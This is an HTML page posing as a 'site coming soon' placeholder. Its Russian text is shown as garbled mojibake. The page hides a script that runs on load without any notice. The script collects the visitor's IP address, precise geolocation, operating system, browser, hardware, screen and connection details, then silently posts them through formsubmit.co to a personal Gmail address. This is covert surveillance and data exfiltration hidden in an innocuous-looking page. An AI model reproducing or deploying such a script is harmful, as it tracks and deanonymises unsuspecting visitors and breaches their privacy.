<body>
    <h1>–°–∞–π—Ç —Å–∫–æ—Ä–æ –∑–∞—Ä–∞–±–æ—Ç–∞–µ—Ç!</h1>

    <script>
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ç–æ—á–Ω–æ–≥–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –û–° –∏ —Ä–∞–∑—Ä—è–¥–Ω–æ—Å—Ç–∏
        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
            let architecture = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –û–°
            if (userAgent.includes('Win64') || userAgent.includes('x64')) {
                os = 'Windows 64-bit';
                architecture = '64-bit';
            } else if (userAgent.includes('Win32') || userAgent.includes('x86')) {
                os = 'Windows 32-bit';
                architecture = '32-bit';
            } else if (userAgent.includes('Mac')) {
                os = 'macOS';
                architecture = '64-bit';
            } else if (userAgent.includes('Linux')) {
                os = 'Linux';
                architecture = '64-bit';
            } else if (userAgent.includes('Android')) {
                os = 'Android';
                architecture = 'ARM';
            } else if (userAgent.includes('iOS')) {
                os = 'iOS';
                architecture = 'ARM';
            }

            return { os, architecture };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Ç–æ—á–Ω–æ–≥–æ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –±—Ä–∞—É–∑–µ—Ä–∞
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browser = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';

            if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
                browser = 'Chrome';
            } else if (userAgent.includes('Firefox')) {
                browser = 'Firefox';
            } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
                browser = 'Safari';
            } else if (userAgent.includes('Edg')) {
                browser = 'Edge';
            } else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
                browser = 'Opera';
            }

            return browser;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ—á–Ω–æ–≥–æ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è (–µ—Å–ª–∏ –¥–æ—Å—Ç—É–ø–Ω–æ)
        function getLocationInfo() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve(`–®–∏—Ä–æ—Ç–∞: ${position.coords.latitude}, –î–æ–ª–≥–æ—Ç–∞: ${position.coords.longitude}`);
                    },
                    (error) => {
                        resolve(`–û—à–∏–±–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ${error.message}`);
                    },
                    { timeout: 5000 }
                );
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ –≤—Å–µ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function collectAllData(ip) {
            const { os, architecture } = getOSInfo();
            const browser = getBrowserInfo();
            const locationInfo = await getLocationInfo();

            // –°–æ–±–∏—Ä–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –±—Ä–∞—É–∑–µ—Ä–µ
            const browserInfo = {
                userAgent: navigator.userAgent,
                browser: browser,
                language: navigator.language,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown'
            };

            // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —ç–∫—Ä–∞–Ω–µ
            const screenInfo = {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            };

            // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
            const connectionInfo = {
                downlink: navigator.connection ? navigator.connection.downlink + ' Mbps' : 'unknown',
                effectiveType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                rtt: navigator.connection ? navigator.connection.rtt + ' ms' : 'unknown',
                saveData: navigator.connection ? navigator.connection.saveData : 'unknown'
            };

            // –§–æ—Ä–º–∏—Ä—É–µ–º –ø–æ–ª–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            const fullMessage = `
üöÄ –ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨ üöÄ

üìç IP –ê–î–†–ï–°: ${ip}

üåç –ì–ï–û–õ–û–ö–ê–¶–ò–Ø:
‚Ä¢ –¢–æ—á–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: ${locationInfo}
‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
‚Ä¢ –õ–æ–∫–∞–ª—å: ${Intl.DateTimeFormat().resolvedOptions().locale}

üíª –°–ò–°–¢–ï–ú–ê:
‚Ä¢ –û–°: ${os}
‚Ä¢ –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞: ${architecture}
‚Ä¢ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${browserInfo.platform}

üîç –ë–†–ê–£–ó–ï–†:
‚Ä¢ –ë—Ä–∞—É–∑–µ—Ä: ${browserInfo.browser}
‚Ä¢ User Agent: ${browserInfo.userAgent}
‚Ä¢ –Ø–∑—ã–∫: ${browserInfo.language}
‚Ä¢ –ö—É–∫–∏ –≤–∫–ª—é—á–µ–Ω—ã: ${browserInfo.cookieEnabled}
‚Ä¢ Java –≤–∫–ª—é—á–µ–Ω–∞: ${browserInfo.javaEnabled}
‚Ä¢ –Ø–¥–µ—Ä CPU: ${browserInfo.hardwareConcurrency}
‚Ä¢ –ü–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${browserInfo.deviceMemory} GB

üñ• –≠–ö–†–ê–ù:
‚Ä¢ –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${screenInfo.width}x${screenInfo.height}
‚Ä¢ –ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞: ${screenInfo.colorDepth} bit

üì° –°–û–ï–î–ò–ù–ï–ù–ò–ï:

‚Ä¢ –¢–∏–ø —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ${connectionInfo.effectiveType}
‚Ä¢ RTT: ${connectionInfo.rtt}
‚Ä¢ –≠–∫–æ–Ω–æ–º–∏—è —Ç—Ä–∞—Ñ–∏–∫–∞: ${connectionInfo.saveData}

‚è∞ –í–†–ï–ú–Ø –ü–û–°–ï–©–ï–ù–ò–Ø: ${new Date().toLocaleString('ru-RU')}
            `;

            return fullMessage;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ –ø–æ—á—Ç—É
        function sendDataToEmail(data) {
            const formData = new FormData();
            formData.append('message', data);
            formData.append('_subject', 'üö® –¢–æ—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—è!');
            formData.append('_captcha', 'false');
            
            fetch('https://formsubmit.co/wplacesosi1@gmail.com', {
                method: 'POST',
                body: formData,
                mode: 'no-cors'
            });
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function collectAndSendData() {
            try {
                // –ü–æ–ª—É—á–∞–µ–º IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // –°–æ–±–∏—Ä–∞–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ
                const allData = await collectAllData(ipData.ip);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ –ø–æ—á—Ç—É
                sendDataToEmail(allData);
            } catch (error) {

                const fallbackData = await collectAllData('–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å IP');
                sendDataToEmail(fallbackData);
            }
        }

        // –ó–∞–ø—É—Å–∫–∞–µ–º —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', collectAndSendData);
    </script>
